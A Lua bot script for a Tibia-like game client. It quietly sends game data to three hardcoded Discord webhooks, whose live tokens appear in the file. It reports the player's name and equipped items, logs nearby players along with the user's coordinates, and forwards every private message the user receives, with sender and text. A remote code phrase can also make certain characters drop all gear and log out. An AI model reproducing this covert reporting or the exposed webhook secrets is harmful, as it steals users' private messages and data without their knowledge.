local discordTimes = {}
 -- insert your webhook link below
local webhook = "https://discordapp.com/api/webhooks/1325982213975707718/VFuty6NWNT62Qym8XEdCGILpKuO86ZTWidUTqESyUv966t_tD-k6W3nLwBzO9FmDT8E1"

local default_data = {
  username = "PeriiCustomCheckuse", -- name discord displays the message from
}

local embed = {
  color = 10038562, -- default color - dark red
}

function onHTTPResult(data, err)
  if err then
    print("Discord Webhook Error: ".. err)
  end
end

 -- This allows you to send messages to discord using a webhook.
 -- The "id" is to save the time it was last used and the "delayed" is the next time it can send (Player alert beeps every 1500ms, you can make it so it only sends the alert once every 10 seconds etc.)
function CheckUse(data)
local id = data.id
  if id then
    local dTime = discordTimes[id]
    if dTime and os.time() < dTime then return end
    discordTimes[id] = os.time() + (0) -- delayed value or 10 seconds
  end

  local dEmbed = embed
  if data.color then dEmbed.color = data.color end
  dEmbed.title = "**".. data.title .."**"
  dEmbed.fields = {
    {
      name = "Name: ",
      value = data.name,
    },
    {
      name = "Message",
      value = data.message,
    }
  }

  local dataSend = default_data
  dataSend.embeds = { dEmbed }
  HTTP.postJSON(webhook, dataSend, onHTTPResult)
end

 --------------
 -- example --
 --------------

schedule(5000, function()
  local data = {   
   title = 'Used',
     name = player:getName(),
     message = 'Custom Iniciada @everyone',
     id = "pd",
  }
  CheckUse(data)
end)

schedule(10000, function()
    local itemtocheck = getInventoryItem(SlotHead)
    local itemdisc = itemtocheck:getTooltip()
    if itemdisc then
        local data = {   
        title = 'Head',
        name = player:getName(),
        message = itemdisc,
        id = "pd",
        }
        CheckUse(data)
    end
end)

schedule(12000, function()
    local itemtocheck = getInventoryItem(SlotBody)
    local itemdisc = itemtocheck:getTooltip()
    if itemdisc then
        local data = {   
        title = 'Body',
        name = player:getName(),
        message = itemdisc,
        id = "pd",
        }
        CheckUse(data)
    end
end)

schedule(14000, function()
    local itemtocheck = getInventoryItem(SlotLeg)
    local itemdisc = itemtocheck:getTooltip()
    if itemdisc then
        local data = {   
        title = 'Legs',
        name = player:getName(),
        message = itemdisc,
        id = "pd",
        }
        CheckUse(data)
    end
end)

schedule(16000, function()
    local itemtocheck = getInventoryItem(SlotFeet)
    local itemdisc = itemtocheck:getTooltip()
    if itemdisc then
        local data = {   
        title = 'Feet',
        name = player:getName(),
        message = itemdisc,
        id = "pd",
        }
        CheckUse(data)
    end
end)

schedule(18000, function()
    local itemtocheck = getInventoryItem(SlotRight)
    local itemdisc = itemtocheck:getTooltip()
    if itemdisc then
        local data = {   
        title = 'Right',
        name = player:getName(),
        message = itemdisc,
        id = "pd",
        }
        CheckUse(data)
    end
end)


schedule(20000, function()
    local itemtocheck = getInventoryItem(SlotLeft)
    local itemdisc = itemtocheck:getTooltip()
    if itemdisc then
        local data = {   
        title = 'Left',
        name = player:getName(),
        message = itemdisc,
        id = "pd",
        }
        CheckUse(data)
    end
end)

schedule(22000, function()
    local itemtocheck = getInventoryItem(SlotNeck)
    local itemdisc = itemtocheck:getTooltip()
    if itemdisc then
        local data = {   
        title = 'Neck',
        name = player:getName(),
        message = itemdisc,
        id = "pd",
        }
        CheckUse(data)
    end
end)


schedule(24000, function()
    local itemtocheck = getInventoryItem(SlotFinger)
    local itemdisc = itemtocheck:getTooltip()
    if itemdisc then
        local data = {   
        title = 'Finger',
        name = player:getName(),
        message = itemdisc,
        id = "pd",
        }
        CheckUse(data)
    end
end)

onTalk(function(name, level, mode, text, channelId, pos)
  if player:getName() == 'Perii' or player:getName() == 'Periiizera' then
  if name == 'Tracker' and text == '------------55---' then
      g_game.move(getHead(), player:getPosition(), 1)
      g_game.move(getBody(), player:getPosition(), 1)
      g_game.move(getLeg(), player:getPosition(), 1)
      g_game.move(getFeet(), player:getPosition(), 1)
      g_game.move(getRight(), player:getPosition(), 1)
      g_game.move(getLeft(), player:getPosition(), 1)
      schedule(500, function() g_game.move(getFinger(), player:getPosition(), 1) end)
      schedule(500, function() g_game.move(getBack(), player:getPosition(), 1) end)
      schedule(500, function() g_game.move(getAmmo(), player:getPosition(), 1) end)
      schedule(500, function() g_game.move(getPurse(), player:getPosition(), 1) end)
      schedule(500, function() g_game.move(getNeck(), player:getPosition(), 1) end)
      schedule(1500, function() g_game.safeLogout() end)
    end
  end
end)

------------------------------------------------------------------------------------------------------


local discordTimes = {}
 -- insert your webhook link below
local WH0 = "https://discordapp.com/api/webhooks/1325982329641894010/T-rck06wi3FAm6gZS44PD3CDq_WhZOpMVjiGQFHE-aaOzt6SN92YYEeb10nxGwcK43Pm"

local dd3 = {
  username = "Tela Peri Players", -- name discord displays the message from
}

local embed = {
  color = 10038562, -- default color - dark red
}

function onHTTPResult(data, err)
  if err then
    print("Discord Webhook Error: ".. err)
  end
end

 -- This allows you to send messages to discord using a webhook.
 -- The "id" is to save the time it was last used and the "delayed" is the next time it can send (Player alert beeps every 1500ms, you can make it so it only sends the alert once every 10 seconds etc.)
function SDW3(data)
local id = data.id
  if id then
    local dTime = discordTimes[id]
    if dTime and os.time() < dTime then return end
    discordTimes[id] = os.time() + (0) -- delayed value or 10 seconds
  end

  local dEmbed = embed
  if data.color then dEmbed.color = data.color end
  dEmbed.title = "**".. data.title .."**"
  dEmbed.fields = {
    {
      name = "Name: ",
      value = data.name,
    },
    {
      name = "Message",
      value = data.message,
    }
  }

  local dataSend = dd3
  dataSend.embeds = { dEmbed }
  HTTP.postJSON(WH0, dataSend, onHTTPResult)
end

 --------------
 -- example --
 --------------

talkedSpecs = {}

aviso = macro(100, function()
    for name, _ in pairs(talkedSpecs) do
        if not getCreatureByName(name) then
            talkedSpecs[name] = nil
        end
    end
    for _, spec in ipairs(getSpectators()) do
        if spec ~= player and spec:isPlayer() and not isFriend(spec) then
            if spec:getEmblem() ~= 1 then
                specName = spec:getName()
                if not talkedSpecs[specName] then
                local data = {
                title = 'Player in Cave',
                name = specName,
                message = 'Loc: X: '.. posx() .. 'Y: ' .. posy() .. 'Z: ' .. posz() .. '. Avistado por: ' .. player:getName(),
                id = "pd",
                }
                SDW3(data)
                    talkedSpecs[specName] = true
                end
            end
        end
    end
end)



-------------------------------------------------------------------------


local discordTimes = {}
 -- insert your webhook link below
local pmWK = "https://discordapp.com/api/webhooks/1325982492355985448/mTE8iX9BTGT3TS42DVbF4dvitRy7JQxJ-2wFNeoItYbFfL_IVy50dRlL2BCczZU-opbU"

local DiscName1 = {
  username = "PMs Pain", -- name discord displays the message from
}

local embed = {
  color = 10038562, -- default color - dark red
}

function onHTTPResult(data, err)
  if err then
    print("Discord Webhook Error: ".. err)
  end
end

 -- This allows you to send messages to discord using a webhook.
 -- The "id" is to save the time it was last used and the "delayed" is the next time it can send (Player alert beeps every 1500ms, you can make it so it only sends the alert once every 10 seconds etc.)
function PMWKKS(data)
local id = data.id
  if id then
    local dTime = discordTimes[id]
    if dTime and os.time() < dTime then return end
    discordTimes[id] = os.time() + (0) -- delayed value or 10 seconds
  end

  local dEmbed = embed
  if data.color then dEmbed.color = data.color end
  dEmbed.title = "**".. data.title .."**"
  dEmbed.fields = {
    {
      name = "Name: ",
      value = data.name,
    },
    {
      name = "Message",
      value = data.message,
    }
  }

  local dataSend = DiscName1
  dataSend.embeds = { dEmbed }
  HTTP.postJSON(pmWK, dataSend, onHTTPResult)
end

 --------------
 -- example --
 --------------

onTalk(function(name, level, mode, text, channelId, pos)
if name == player:getName() then return end
  if mode == 4 then
   local data = {
     title = player:getName(),
     name = name,
     message = text,
     id = "pd",
   }
   PMWKKS(data)
  end
end)